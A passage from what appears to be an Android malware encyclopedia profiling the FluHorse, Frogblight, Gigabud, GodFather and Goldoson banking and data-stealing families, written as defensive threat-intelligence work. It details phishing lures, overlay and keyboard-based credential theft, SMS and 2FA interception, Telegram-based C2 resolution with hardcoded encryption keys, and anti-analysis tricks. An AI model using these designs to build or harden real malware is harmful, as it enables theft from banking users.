continuing through ongoing deployment of new infrastructure and apps each month.</p>"},{"location":"malware/families/fluhorse/#overview","title":"Overview","text":"Attribute Details First Seen May 2022 (earliest activity), May 2023 (public disclosure) Status Active Type Credential stealer, SMS interceptor Attribution Unknown Discovered By Check Point Research Target Region East Asia (Taiwan, Vietnam) Distribution Phishing emails with fake APK download links Notable Feature Built with Flutter/Dart, business logic compiled into <code>libapp.so</code>"},{"location":"malware/families/fluhorse/#distribution","title":"Distribution","text":"Vector Details Phishing emails Targeted emails sent to high-profile entities including government officials and employees of large industrial companies Fake APK downloads Email links direct victims to phishing sites hosting malicious APKs App impersonation Mimics popular legitimate apps with over 1 million installs each <p>FluHorse campaigns begin with targeted phishing emails. The emails are crafted to appear urgent and credible, sometimes referencing payment issues or account problems. Recipients are directed to a phishing site via a link in the email, where they download a fake app APK. The social engineering relies on impersonating apps that the target audience already trusts and uses frequently.</p>"},{"location":"malware/families/fluhorse/#impersonated-applications","title":"Impersonated Applications","text":"App Region Legitimate Installs ETC (Electronic Toll Collection) Taiwan 1,000,000+ VPBank Neo Vietnam 1,000,000+ Unnamed major transportation app Taiwan 1,000,000+ <p>The Taiwan targeting leverages the Far Eastern Electronic Toll Collection (FETC) system, which processes approximately 16 million transactions per day across more than 6 million users, making it a high-value impersonation target.</p>"},{"location":"malware/families/fluhorse/#capabilities","title":"Capabilities","text":"<ul> <li>Credential theft: fake login screens prompt victims to enter account credentials, which are exfiltrated to the C2 server</li> <li>Credit card harvesting: prompts victims to enter credit card details under the guise of payment processing</li> <li>SMS interception: intercepts all incoming SMS messages, including 2FA codes, using the Telephony package</li> <li>2FA bypass: captured SMS authentication codes enable attackers to bypass two-factor authentication on compromised accounts</li> <li>Delayed execution: after credential submission, the app displays a \"system is busy\" message while silently processing stolen data, buying time before the victim suspects anything</li> </ul>"},{"location":"malware/families/fluhorse/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/fluhorse/#flutter-architecture","title":"Flutter Architecture","text":"<p>FluHorse's defining technical characteristic is its use of the Flutter framework. The malware is written in Dart and compiled using Flutter's ahead-of-time (AOT) compilation:</p> Component Role <code>libflutter.so</code> Flutter engine (legitimate framework library) <code>libapp.so</code> Compiled Dart payload containing all malicious logic Kotlin wrapper Minimal Android shell, handles app launch and Flutter engine initialization <p>The Dart code inside <code>libapp.so</code> runs within Flutter's custom virtual machine rather than the Dalvik VM. Standard Android reverse engineering tools like jadx or apktool cannot decompile this payload. Analyzing <code>libapp.so</code> requires specialized approaches for Dart AOT snapshots, which involve optimized and poorly documented formats with limited tooling support.</p> <p>Fortinet's FortiGuard Labs published a detailed reverse engineering analysis demonstrating techniques for statically reversing the Dart AOT snapshot within <code>libapp.so</code>. This work, later presented at Virus Bulletin 2024, advanced the tooling available for analyzing Flutter-based malware.</p>"},{"location":"malware/families/fluhorse/#malicious-flow","title":"Malicious Flow","text":"<ol> <li>Victim installs the fake app from the phishing site</li> <li>App displays a convincing replica of the legitimate app's login interface</li> <li>Victim enters credentials (account details or credit card data)</li> <li>Data is exfiltrated to the C2 server via HTTP POST</li> <li>App displays a \"system is busy\" holding screen for several minutes</li> <li>Meanwhile, the Dart payload begins intercepting all incoming SMS messages</li> <li>Intercepted SMS messages (including 2FA codes) are forwarded to the C2 server</li> <li>After the delay period, the app tells the user to try again later</li> </ol>"},{"location":"malware/families/fluhorse/#c2-communication","title":"C2 Communication","text":"<p>FluHorse uses HTTP-based C2 communication. The Dart payload sends stolen data via HTTP POST requests to attacker-controlled servers. Fortinet's analysis identified the path <code>/addcontent3</code> as one of the endpoints used for exfiltrating intercepted SMS messages. The simplicity of the protocol reflects the malware's overall design philosophy: rely on the Flutter framework for obfuscation rather than implementing custom evasion in the network layer.</p>"},{"location":"malware/families/fluhorse/#anti-analysis","title":"Anti-Analysis","text":"Technique Details Flutter framework Business logic in <code>libapp.so</code> defeats standard Android decompilation Dart AOT compilation Custom VM with optimized, undocumented snapshot format Minimal native code Almost no analyzable Kotlin/Java logic, everything is in Dart Packing (later samples) June 2023 samples introduced packing, indicating operational maturity <p>The initial May 2023 campaign samples had minimal obfuscation and no packing. By June 2023, Check Point observed packed samples appearing, showing the operators were actively hardening their toolchain.</p>"},{"location":"malware/families/fluhorse/#versions-and-evolution","title":"Versions and Evolution","text":"Period Development May 2022 Earliest observed FluHorse activity May 2023 Check Point Research publishes initial disclosure, samples unpacked June 2023 Packed samples observed, indicating increased operational maturity 2023-present Ongoing campaigns with new infrastructure and apps deployed monthly"},{"location":"malware/families/fluhorse/#why-flutter-matters-for-offense","title":"Why Flutter Matters for Offense","text":"<p>Flutter's adoption by malware authors represents a practical shift in Android threat development. The framework provides several advantages:</p> <ul> <li>Analysis barrier: the Dart AOT snapshot in <code>libapp.so</code> cannot be processed by jadx, apktool, or other standard Android RE tools. Analysts must use specialized Dart snapshot parsers, which are immature and frequently break across Flutter versions.</li> <li>Cross-platform potential: Flutter natively supports Android, iOS, web, and desktop from a single codebase, though FluHorse has only been observed on Android.</li> <li>Rapid UI development: Flutter's widget system makes it straightforward to create convincing replicas of legitimate app interfaces, improving phishing effectiveness.</li> <li>Low malicious footprint in DEX: since the malicious logic lives in native code (<code>libapp.so</code>), the Android manifest and DEX classes contain almost nothing suspicious, potentially evading signature-based detection focused on Dalvik bytecode.</li> </ul>"},{"location":"malware/families/fluhorse/#references","title":"References","text":"<ul> <li>Eastern Asian Android Assault - FluHorse - Check Point Research</li> <li>FluHorse - Check Point Blog</li> <li>Fortinet Reverses Flutter-based Android Malware \"Fluhorse\"</li> <li>Virus Bulletin 2024 - Android Flutter Malware</li> <li>New Android Malware FluHorse Targeting East Asian Markets - The Hacker News</li> <li>Fluhorse: Flutter-Based Android Malware Targets Credit Cards and 2FA Codes - The Hacker News</li> <li>New Android FluHorse malware steals your passwords, 2FA codes - BleepingComputer</li> <li>FluHorse - Malpedia</li> </ul>"},{"location":"malware/families/frogblight/","title":"Frogblight","text":"<p>Frogblight is a Turkish banking trojan distributed via smishing as fake court case notification documents. Kaspersky published the analysis in August 2025, documenting a banking trojan that records keystrokes via a custom InputMethodService (keyboard) and uses geofencing to avoid execution in the United States, a common tactic to reduce exposure to US-based security researchers and sandboxes. Kaspersky noted possible connections to the Coper MaaS ecosystem, which traces lineage back to Exobot through ExobotCompact/Octo.</p>"},{"location":"malware/families/frogblight/#overview","title":"Overview","text":"Attribute Details First Seen 2025 Last Seen Active Status Active, under development Type Banking trojan with keylogging via custom keyboard Attribution Unknown; possible Coper MaaS connection Aliases None known"},{"location":"malware/families/frogblight/#vendor-names","title":"Vendor Names","text":"Vendor Name Kaspersky HEUR:Trojan-Banker.AndroidOS.Frogblight ESET Android/Spy.Banker.Frogblight"},{"location":"malware/families/frogblight/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Kaspersky identified possible connections to the Coper MaaS operation, which is part of the Exobot lineage:</p> <pre><code>Exobot (2016) -&gt; ExobotCompact/Coper (2021) -&gt; Octo (2022)\n                                              -&gt; Frogblight (2025)?\n</code></pre> <p>If the Coper connection is confirmed, Frogblight would join Octo as a descendant of the Exobot lineage. However, this relationship requires further analysis and has not been definitively established.</p>"},{"location":"malware/families/frogblight/#distribution","title":"Distribution","text":"Vector Details Smishing SMS messages impersonating Turkish court notifications Fake court documents APKs disguised as court case viewing applications Social engineering Urgency-based lures about pending legal proceedings <p>The court case impersonation creates strong urgency: recipients believe they have pending legal matters requiring immediate attention, motivating them to install the \"document viewer\" app. This social engineering approach parallels Copybara's TOAD-based delivery and Zanubis's government impersonation, where official-seeming communications compel installation.</p>"},{"location":"malware/families/frogblight/#capabilities","title":"Capabilities","text":"Capability Description Custom keyboard keylogging Records keystrokes via malicious InputMethodService Overlay attacks Credential phishing overlays over Turkish banking apps SMS interception Reads and intercepts OTP codes Geofencing Refuses to execute on devices with US locale/SIM Screen recording Captures device screen activity Contact exfiltration Uploads contact list Persistence Prevents uninstallation via accessibility"},{"location":"malware/families/frogblight/#custom-keyboard-keylogging","title":"Custom Keyboard Keylogging","text":"<p>Frogblight's primary keylogging mechanism uses Android's InputMethodService API to register as a custom input method (keyboard). Once enabled, the custom keyboard captures every keystroke entered by the user across all applications, including banking apps, messaging apps, and browsers. This approach differs from accessibility-based keylogging used by most banking trojans (Cerberus, Anubis, Hook):</p> Method Pros Cons Accessibility keylogging Captures from any keyboard Increasingly restricted by Android Custom keyboard (Frogblight) Direct keystroke access, harder to detect Requires user to enable the keyboard"},{"location":"malware/families/frogblight/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/frogblight/#inputmethodservice-implementation","title":"InputMethodService Implementation","text":"<p>The malware registers an InputMethodService that functions as a system keyboard:</p> <ol> <li>During installation, the user is prompted to enable the custom keyboard</li> <li>Once enabled, it replaces the default keyboard for all text input</li> <li>All keystrokes are logged and sent to C2</li> <li>The keyboard UI mimics a standard Android keyboard to avoid suspicion</li> </ol>"},{"location":"malware/families/frogblight/#geofencing","title":"Geofencing","text":"<p>Frogblight checks device locale, SIM card country code, and IP geolocation. If US-based indicators are detected, the malware deactivates. This reduces the chance of analysis by US-based security researchers and sandbox environments, which are disproportionately used by major security vendors.</p> Check Method SIM country TelephonyManager.getSimCountryIso() Device locale Locale.getDefault() IP geolocation HTTP request to IP geolocation service"},{"location":"malware/families/frogblight/#c2-communication","title":"C2 Communication","text":"<ul> <li>HTTPS-based communication</li> <li>Device registration with hardware fingerprint</li> <li>Command polling for overlay updates and target list</li> <li>Real-time keystroke exfiltration</li> </ul>"},{"location":"malware/families/frogblight/#target-regions","title":"Target Regions","text":"Region Details Turkey Primary and exclusive target <p>Frogblight targets major Turkish banks and financial institutions. The geofencing exclusion of US devices and the Turkish court document lures confirm the narrow geographic focus.</p>"},{"location":"malware/families/frogblight/#notable-campaigns","title":"Notable Campaigns","text":"<p>2025: Kaspersky publishes Frogblight analysis, documenting the custom keyboard keylogging approach, court case smishing lures, and geofencing. The research notes possible connections to the Coper MaaS ecosystem, suggesting potential code sharing with the Exobot/Octo lineage.</p>"},{"location":"malware/families/gigabud/","title":"Gigabud","text":"<p>Gigabud is an Android banking RAT from the GoldFactory threat group, the same Chinese-speaking cybercrime operation behind GoldPickaxe and GoldDigger. Cyble first documented Gigabud in January 2023 after observing it impersonating government agencies and banking apps across Southeast Asia, with activity dating back to at least July 2022. Unlike most banking trojans that rely on HTML overlay attacks for credential theft, Gigabud uses screen recording as its primary data capture mechanism, allowing it to record everything the victim does within targeted banking applications. A September 2024 investigation by Zimperium zLabs revealed that Gigabud shares distribution infrastructure with SpyNote, with both families protected by the Virbox packer, indicating coordinated deployment by the same threat actor.</p>"},{"location":"malware/families/gigabud/#overview","title":"Overview","text":"Attribute Details First Seen July 2022 Status Active, under continued development Type Banking RAT, credential stealer Attribution GoldFactory group (Chinese-speaking threat actors) Aliases Gigabud RAT, Gigabud.Loan (data-theft variant), Gigaflower (successor) Target Region Southeast Asia (Thailand, Vietnam, Philippines, Indonesia), Peru, expanding globally Distribution Phishing sites impersonating government agencies, banks, and loan apps Notable Feature Screen recording for credential capture instead of overlay attacks"},{"location":"malware/families/gigabud/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Gigabud belongs to the GoldFactory threat group's malware ecosystem, which includes several related Android banking trojan families. Cyble's August 2024 analysis established clear code-level overlap between Gigabud and GoldDigger, confirming shared authorship. Both families use the native library <code>libstrategy.so</code> for interacting with UI elements of targeted banking applications, and both adopted the Virbox packer for protection.</p> Family Relationship GoldDigger Shares code overlap, common <code>libstrategy.so</code> library, and Virbox packer usage. Android banking trojan targeting Vietnamese banks. GoldPickaxe Sibling family from GoldFactory. Introduced facial biometric theft for deepfake-based bank verification bypass. Has both Android and iOS variants. GoldDiggerPlus Enhanced GoldDigger variant with real-time voice communication during active device compromise. SpyNote Shared distribution infrastructure. Zimperium identified 79 phishing sites and 11 C2 servers distributing both Gigabud and SpyNote. Gigaflower Pre-release successor variant discovered by Group-IB in testing infrastructure. Likely next evolution of the Gigabud line."},{"location":"malware/families/gigabud/#distribution","title":"Distribution","text":"Vector Details Phishing sites Fake websites impersonating Google Play Store listings, government portals, and banking apps Smishing SMS messages with links to phishing sites, often under the pretext of tax audits or refund claims Social engineering Links distributed via instant messengers and social media Fake loan apps Gigabud.Loan variant poses as fictitious financial institutions offering loans Government impersonation Apps disguised as official government agency tools <p>Gigabud distribution is regionally tailored. In Thailand, operators impersonate the Department of Special Investigation (DSI) and revenue agencies. The DSI itself issued a warning in July 2022 about phishing sites impersonating its website and distributing the RAT. The Thailand Telecommunication Sector CERT (TTC-CERT) separately discovered the malware distributed as \"Revenue.apk\" and published a technical advisory in September 2022.</p> <p>In the Philippines, the malware impersonates banking apps. In Peru, it poses as government tax agencies. Distribution infrastructure has expanded significantly since mid-2024, with Zimperium documenting 79 phishing sites across a coordinated campaign targeting users globally.</p>"},{"location":"malware/families/gigabud/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/gigabud/#gigabudrat","title":"Gigabud.RAT","text":"Capability Implementation Screen recording Primary credential capture method, records victim activity within banking apps Accessibility service abuse Enables screen recording, gesture simulation, and UI interaction Remote device access Full remote control of victim device through gesture simulation (TouchAction) Automated payments Performs transactions from victim's device via accessibility-driven gestures 2FA bypass Intercepts authentication codes and performs gestures to complete verification flows Clipboard manipulation Replaces bank card numbers in clipboard with attacker-controlled numbers Credential harvesting Captures login credentials through screen recording rather than overlay injects Delayed malicious execution Does not execute malicious actions until the user is authorized into the app, evading sandbox analysis"},{"location":"malware/families/gigabud/#screen-recording-vs-overlay-attacks","title":"Screen Recording vs. Overlay Attacks","text":"<p>Gigabud's use of screen recording instead of HTML overlay attacks is a deliberate design choice. Most Android banking trojans display fake login screens (overlays) on top of legitimate banking apps to capture credentials. Gigabud instead records the victim's screen while they interact with the real banking app. This approach has trade-offs:</p> <ul> <li>Captures credentials entered into the actual banking app, not a fake copy</li> <li>Records the full session including navigation, account details, and balance information</li> <li>Avoids the need to maintain overlay inject templates for each target bank</li> <li>Pairs with remote device access to allow operators to take over mid-session</li> <li>Less susceptible to overlay detection mechanisms that some banking apps implement</li> </ul>"},{"location":"malware/families/gigabud/#gigabudloan","title":"Gigabud.Loan","text":"<p>Gigabud.Loan is a stripped-down variant that lacks RAT capabilities entirely. It operates as a data harvester disguised as fake loan applications from fictitious financial institutions. The Loan variant shares the same architecture and code-signing certificate as Gigabud.RAT.</p> Data Collected Details Personal information Full name, identity number Identity documents Photos of national identity documents, digital signatures Financial data Bank card information, income details Background information Education, employment <p>Group-IB detected more than 400 Gigabud.RAT samples and more than 20 Gigabud.Loan samples between 2022 and 2023.</p>"},{"location":"malware/families/gigabud/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/gigabud/#accessibility-service-abuse","title":"Accessibility Service Abuse","text":"<p>Gigabud's core functionality depends on the Android Accessibility Service. The <code>TouchAction</code> feature abuses accessibility to simulate user gestures on the device, enabling:</p> <ul> <li>Screen recording of banking app sessions</li> <li>Automated gesture sequences to complete transactions</li> <li>Navigation through banking app interfaces on behalf of the operator</li> <li>Bypassing authentication steps including 2FA prompts</li> </ul>"},{"location":"malware/families/gigabud/#delayed-execution","title":"Delayed Execution","text":"<p>A distinctive characteristic of Gigabud is its delayed malicious execution. The RAT does not activate malicious functionality until the victim has been authenticated into the fake application by a fraudster on the other end. This makes automated sandbox detection significantly harder, as the malware appears benign during initial analysis windows.</p>"},{"location":"malware/families/gigabud/#shared-infrastructure-with-spynote","title":"Shared Infrastructure with SpyNote","text":"<p>Zimperium's September 2024 investigation uncovered that Gigabud and SpyNote share distribution infrastructure:</p> Finding Details Phishing sites 79 identified, distributing both families C2 servers 11 shared command-and-control servers Targeted apps 50+ financial apps (40+ banks, 10 cryptocurrency platforms) Packer Both families protected by Virbox packer Code overlap Code similarities between SpyNote and Gigabud samples suggest shared authorship <p>This infrastructure overlap indicates Gigabud is deployed alongside SpyNote in coordinated campaigns, with the banking RAT and the general-purpose RAT serving complementary roles.</p>"},{"location":"malware/families/gigabud/#anti-analysis","title":"Anti-Analysis","text":"Technique Details Virbox packer Commercial packer providing DEX encryption, native code protection, anti-debugging, and anti-emulator checks Delayed execution Malicious behavior requires operator interaction, bypassing automated sandbox analysis ZIP format exploitation Evasion techniques exploiting the zip file format, shared with GoldDigger variants <code>libstrategy.so</code> Native library handling UI interaction logic, harder to analyze than Dalvik bytecode"},{"location":"malware/families/gigabud/#target-regions-and-campaigns","title":"Target Regions and Campaigns","text":"Period Targets Activity July 2022 Thailand First campaigns impersonating DSI and revenue agencies. DSI issues public warning. September 2022 Thailand TTC-CERT discovers \"Revenue.apk\" variant and publishes advisory Late 2022 Thailand, Peru, Philippines Expansion to impersonate banking and government apps in new regions January 2023 Thailand, Peru, Philippines Cyble publishes first public analysis August 2023 Thailand, Vietnam, Philippines, Indonesia, Peru Group-IB publishes comprehensive analysis documenting 400+ RAT samples and 20+ Loan samples August 2024 Expanding globally Cyble documents code overlap between Gigabud and GoldDigger. New variants using Virbox packer detected. September 2024 50+ financial institutions worldwide Zimperium reveals shared infrastructure with SpyNote, 79 phishing sites, 11 C2 servers June-July 2024 onward Bangladesh, Indonesia, Mexico, South Africa, Ethiopia Significant surge in new Gigabud variants and distribution volume Late 2024-2025 Southeast Asia Group-IB uncovers GoldFactory deploying modified banking apps, driving 11,000+ infections. Pre-release Gigaflower successor variant found in testing infrastructure."},{"location":"malware/families/gigabud/#related-families","title":"Related Families","text":"Family Relationship GoldPickaxe Sibling within GoldFactory ecosystem. Both target Southeast Asian banking, but GoldPickaxe focuses on biometric theft for deepfake fraud rather than screen recording. GoldDigger Direct code overlap with Gigabud, shared <code>libstrategy.so</code> native library, and common Virbox packer usage. Predecessor within the GoldFactory group. SpyNote Shared distribution infrastructure (79 phishing sites, 11 C2 servers). Both protected by Virbox packer. SpyNote provides general RAT capabilities alongside Gigabud's banking-focused functionality."},{"location":"malware/families/gigabud/#references","title":"References","text":"<ul> <li>Gigabud RAT: New Android RAT Masquerading as Government Agencies - Cyble (January 2023)</li> <li>Breaking down Gigabud banking malware with Group-IB Fraud Matrix - Group-IB (August 2023)</li> <li>Overlap Between Golddigger &amp; Gigabud Android Malware - Cyble (August 2024)</li> <li>A Network of Harm: Gigabud Threat and Its Associates - Zimperium (September 2024)</li> <li>Gold Rush is back to APAC: Group-IB unveils first iOS trojan stealing your face - Group-IB</li> <li>Gigabud RAT Android Banking Malware Targets Institutions Across Countries - The Hacker News</li> <li>Gigabud - Malpedia</li> </ul>"},{"location":"malware/families/godfather/","title":"GodFather","text":"<p>GodFather is the modern successor to Anubis, built on its leaked source code but substantially rewritten for current Android versions. First detected by Group-IB in June 2021 and publicly disclosed by ThreatFabric in March 2022, GodFather targets 400+ financial applications across 16 countries using dynamically generated overlay WebViews. Its operators retrieve C2 addresses from encrypted Telegram channel descriptions, a technique that provides resilient infrastructure with minimal effort. The malware explicitly avoids post-Soviet country devices, strongly indicating Russian-speaking development.</p>"},{"location":"malware/families/godfather/#overview","title":"Overview","text":"Property Value First Seen June 2021 (Group-IB detection); publicly documented March 2022 Last Seen / Status Active, ongoing development with v2 native code migration Type Banking trojan, infostealer Attribution Russian-speaking operators (inferred from language-based kill switch) Aliases None widely established"},{"location":"malware/families/godfather/#origin-and-lineage","title":"Origin and Lineage","text":"<p>GodFather's codebase derives directly from Anubis, whose source code was leaked in January 2019. The developers took the Anubis code as a foundation and modernized it to work on newer Android versions, where many of Anubis's original techniques (particularly overlay injection via <code>SYSTEM_ALERT_WINDOW</code>) had been restricted by Google.</p> <p>Group-IB's detailed analysis confirmed the Anubis lineage through code structure comparison, but noted that the GodFather developers rewrote substantial portions: the overlay delivery mechanism, C2 communication protocol, and evasion techniques are all new. This is not a simple Anubis fork with cosmetic changes but a ground-up rebuild using Anubis as scaffolding.</p> <p>GodFather sits within the broader ecosystem of Anubis-derived malware. Where Ginp selectively borrowed Anubis components, GodFather represents a more comprehensive modernization effort.</p>"},{"location":"malware/families/godfather/#distribution","title":"Distribution","text":"<p>Google Play droppers: Group-IB identified GodFather distributed through decoy applications hosted on Google Play. These apps mimic legitimate utilities and pass initial screening before downloading the banking payload.</p> <p>Fake app impersonation: Cyble discovered GodFather samples masquerading as the MYT Muzik app, a popular Turkish music streaming application. The fake app was visually identical to the legitimate version, targeting Turkish users specifically.</p> <p>Third-party stores and phishing: Distribution also occurs through third-party app stores, phishing pages, and SMS lures directing victims to malicious download sites.</p> <p>The malware's language-based kill switch (see Target Regions below) means distribution campaigns are geographically selective, avoiding markets where the malware would self-terminate.</p>"},{"location":"malware/families/godfather/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/godfather/#core-feature-set","title":"Core Feature Set","text":"Capability Implementation Dynamic overlay injection Fetches overlay WebView HTML from C2, generates phishing screens matching targeted apps Keylogging Accessibility Service captures all text input events Screen recording Records device screen via MediaProjection or Accessibility Screenshot capture Takes screenshots on demand or triggered by targeted app launch SMS interception Reads and hides incoming SMS for OTP/2FA theft Call log harvesting Exfiltrates call history Contact exfiltration Steals device contact list Notification interception Reads notification content, including push-based 2FA codes Device Admin abuse Requests admin privileges to prevent uninstallation Google Play Protect bypass Disables Play Protect via Accessibility navigation Proxy/VNC Remote device interaction through accessibility-based commands USSD execution Executes USSD codes on the device Call forwarding Forwards incoming calls to attacker-controlled numbers"},{"location":"malware/families/godfather/#version-evolution","title":"Version Evolution","text":"Version Period Key Changes v1 2021-2023 Anubis-derived Java codebase, Telegram-based C2 resolution, Blowfish encryption, overlay injection targeting 400+ apps v2 2024+ Migration to native code, reduced permission footprint, heavier reliance on Accessibility Service, expanded to 500+ targeted apps, new geographic targets (Japan, Greece, Singapore, Azerbaijan) v3 2025 On-device virtualization: creates isolated virtual environment, installs real banking apps inside it, intercepts all interactions at runtime. Hooks OkHttp <code>build()</code> to inject network interceptor. Turkish bank focus. ZIP manipulation + manifest obfuscation + <code>$JADXBLOCK</code> fields to defeat static analysis."},{"location":"malware/families/godfather/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/godfather/#c2-resolution-via-telegram","title":"C2 Resolution via Telegram","text":"<p>GodFather's most distinctive technical feature is its C2 address retrieval mechanism:</p> <ol> <li>The malware contains a hardcoded link to an attacker-controlled Telegram channel</li> <li>It fetches the channel description via HTTP request</li> <li>The description contains a Base64-encoded, Blowfish-encrypted string</li> <li>The malware decrypts the string using Blowfish in ECB mode with the hardcoded key <code>ABC</code></li> <li>The decrypted result is the active C2 URL</li> </ol> <p>This approach provides the operators with trivially updatable C2 infrastructure: changing the active server requires only editing a Telegram channel description. Group-IB documented this mechanism in detail, and independent technical analysis confirmed the Blowfish ECB implementation.</p>"},{"location":"malware/families/godfather/#c2-communication-encryption","title":"C2 Communication Encryption","text":"<p>After resolving the C2 address, ongoing bot-to-server communication uses AES/CBC/NoPadding with:</p> <ul> <li>IV: <code>fedcba9876543210</code></li> <li>Key: <code>0123456789abcdef</code></li> </ul> <p>These values are hardcoded in the malware. The use of static, predictable encryption parameters suggests the operators prioritize operational simplicity over cryptographic strength, relying instead on the Telegram-based C2 resolution layer for infrastructure resilience.</p>"},{"location":"malware/families/godfather/#overlay-injection-mechanism","title":"Overlay Injection Mechanism","text":"<p>GodFather generates overlay screens dynamically rather than bundling static HTML:</p> <ol> <li>The bot sends the C2 a list of installed applications</li> <li>The C2 returns a target list with corresponding overlay URLs</li> <li>When a targeted app enters the foreground (detected via Accessibility events), the malware loads the overlay URL in a WebView positioned over the legitimate app</li> <li>Credentials entered into the WebView are captured and sent to the C2</li> </ol> <p>The C2-hosted overlay approach means operators can update, add, or modify phishing screens without pushing a new APK to infected devices.</p>"},{"location":"malware/families/godfather/#language-based-kill-switch","title":"Language-Based Kill Switch","text":"<p>On first execution, GodFather checks the device's configured language. If the device language matches any of the following, the malware terminates and does not execute:</p> <ul> <li>Russian</li> <li>Azerbaijani</li> <li>Armenian</li> <li>Belarusian</li> <li>Kazakh</li> <li>Kyrgyz</li> <li>Moldovan</li> <li>Tajik</li> <li>Uzbek</li> </ul> <p>This post-Soviet language exclusion is a strong indicator of Russian-speaking developers protecting their local operating environment, a pattern shared with Cerberus, Hook, and other MaaS families.</p>"},{"location":"malware/families/godfather/#v2-native-code-migration","title":"v2 Native Code Migration","text":"<p>Cyble's analysis of GodFather v2 documents a significant architectural shift: core malicious logic has been moved from Java/Kotlin to native code (C/C++ via JNI). The native functions implement:</p> <ul> <li>Injection URL loading into WebView</li> <li>Automated gesture execution</li> <li>C2 connection establishment</li> <li>Keylogging</li> </ul> <p>This migration makes static analysis substantially harder, as native code is not decompilable to readable Java. The v2 variant also operates with fewer declared permissions, shifting more functionality to Accessibility Service abuse.</p>"},{"location":"malware/families/godfather/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>GodFather's targeting is broad but weighted toward specific regions:</p> Region Details Turkey Primary target; fake MYT Muzik app, Turkish banking overlay templates United States Major US banks and crypto exchanges United Kingdom UK banking apps Spain Spanish banks and financial services Italy Italian banking apps Canada Canadian financial institutions Germany BaFin issued a public warning about GodFather targeting German banking users France French banking apps Japan Added in v2 expansion Singapore Added in v2 expansion Greece Added in v2 expansion Azerbaijan Added in v2 expansion <p>The target list encompasses:</p> <ul> <li>215+ banking applications</li> <li>94 cryptocurrency wallet providers</li> <li>110+ cryptocurrency exchange platforms</li> </ul> <p>Cyble's v2 analysis documented expansion to 500+ targeted applications with new geographic reach.</p> <p>Excluded regions: All post-Soviet language countries (Russia, Belarus, Kazakhstan, Uzbekistan, Armenia, Azerbaijan, Kyrgyzstan, Tajikistan, Moldova).</p>"},{"location":"malware/families/godfather/#notable-campaigns","title":"Notable Campaigns","text":"<p>June 2021, initial detection: Group-IB first detected GodFather samples in the wild. At this stage the malware was in early development, with a smaller target list and less sophisticated evasion.</p> <p>March 2022, ThreatFabric disclosure: ThreatFabric publicly documented GodFather as part of their broader analysis of the Android banking trojan surge fueled by the Anubis and Cerberus source code leaks. They confirmed the Anubis code lineage and noted the modernized overlay mechanism.</p> <p>October 2022, MYT Muzik campaign (Turkey): Cyble identified GodFather samples impersonating the popular Turkish music app MYT Muzik. The campaign specifically targeted Turkish banking users with localized overlay templates.</p> <p>December 2022, Group-IB full report: Group-IB published their comprehensive analysis covering 400+ targeted apps across 16 countries. The report detailed the Telegram-based C2 mechanism, Blowfish encryption, and post-Soviet language exclusion. Germany's BaFin financial regulator issued a public advisory in response.</p> <p>2023, EclecticIQ European expansion analysis: EclecticIQ documented GodFather's expansion into additional European markets, with updated overlay templates targeting banks not present in earlier campaigns.</p> <p>2024, Cyble v2 analysis (500+ targets): Cyble analyzed the second major version of GodFather, documenting the native code migration, reduced permission footprint, expanded target list of 500+ apps, and new geographic coverage including Japan, Singapore, Greece, and Azerbaijan.</p> <p>2024, Cyble follow-up on evolved capabilities: Cyble published additional analysis covering new automated commands for device interface navigation, gesture execution on target apps, screen brightness manipulation, and notification settings control.</p> <p>July 2025, virtualization-based v3: Zimperium zLabs uncovered a major evolution: GodFather v3 creates an on-device virtual environment, installs the legitimate banking or crypto app inside it, and intercepts all user interactions at runtime. Instead of overlay phishing, the victim interacts with the real banking app running in a controlled sandbox. The malware hooks OkHttp's <code>build()</code> method to inject a custom interceptor that logs all network requests, capturing credentials and transaction data from the real app's traffic. This represents a fundamental shift from the overlay injection model used since GM Bot's 2014 invention to a virtualization-based interception approach. Targets 500+ banking and crypto apps, currently focused on Turkish banks.</p>"},{"location":"malware/families/goldoson/","title":"Goldoson","text":"<p>Goldoson is a malicious advertising SDK discovered embedded in 60+ legitimate applications with over 100 million cumulative downloads on Google Play and Korea's ONE store. McAfee published the discovery in April 2023, documenting a supply chain compromise where app developers unknowingly included a third-party SDK containing data collection and ad click fraud capabilities. The SDK collected installed app lists, Wi-Fi and Bluetooth device information, and GPS location while performing background ad click fraud.</p>"},{"location":"malware/families/goldoson/#overview","title":"Overview","text":"Attribute Details First Seen 2023 (discovery) Last Seen 2023 (remediated after disclosure) Status Remediated, apps updated or removed Type Malicious SDK, adware, data harvester Attribution Unknown SDK developer Aliases None known"},{"location":"malware/families/goldoson/#vendor-names","title":"Vendor Names","text":"Vendor Name McAfee Android/Goldoson Kaspersky not-a-virus:HEUR:AdWare.AndroidOS.Goldoson AhnLab PUP/Android.Goldoson"},{"location":"malware/families/goldoson/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Goldoson is not a standalone malware family but a malicious SDK distributed through a third-party advertising library. The compromise follows the same supply chain attack pattern as Necro (Coral SDK) and Triada (firmware-level), though at the SDK/library level rather than the system level. Developers integrating the SDK into their apps were likely unaware of its data collection and ad fraud capabilities.</p>"},{"location":"malware/families/goldoson/#distribution","title":"Distribution","text":"<p>Goldoson reached users through legitimate apps on two major Korean app stores:</p> Platform App Count Combined Downloads Google Play 60+ apps 100M+ ONE Store (Korea) 8+ apps Additional millions <p>Affected apps included popular Korean utility, entertainment, and lifestyle applications. The developers were victims of the supply chain compromise, not participants.</p>"},{"location":"malware/families/goldoson/#remediation","title":"Remediation","text":"<p>After McAfee's disclosure:</p> <ul> <li>Google removed non-compliant apps from Play Store</li> <li>Developers who updated their apps to remove the Goldoson SDK had apps reinstated</li> <li>ONE store conducted a parallel review and cleanup</li> </ul>"},{"location":"malware/families/goldoson/#capabilities","title":"Capabilities","text":"Capability Description Installed app inventory Collects list of all installed applications Wi-Fi device scanning Records nearby Wi-Fi access points and connected devices Bluetooth device scanning Records nearby Bluetooth devices GPS location tracking Periodic location collection Background ad clicking Loads and clicks ads in hidden WebViews Device fingerprinting Hardware identifiers, OS version, build information"},{"location":"malware/families/goldoson/#data-collection","title":"Data Collection","text":"<p>The SDK operated on a schedule, periodically collecting and uploading device data:</p> <ul> <li>Every 2 days: installed app list, location, Wi-Fi/Bluetooth 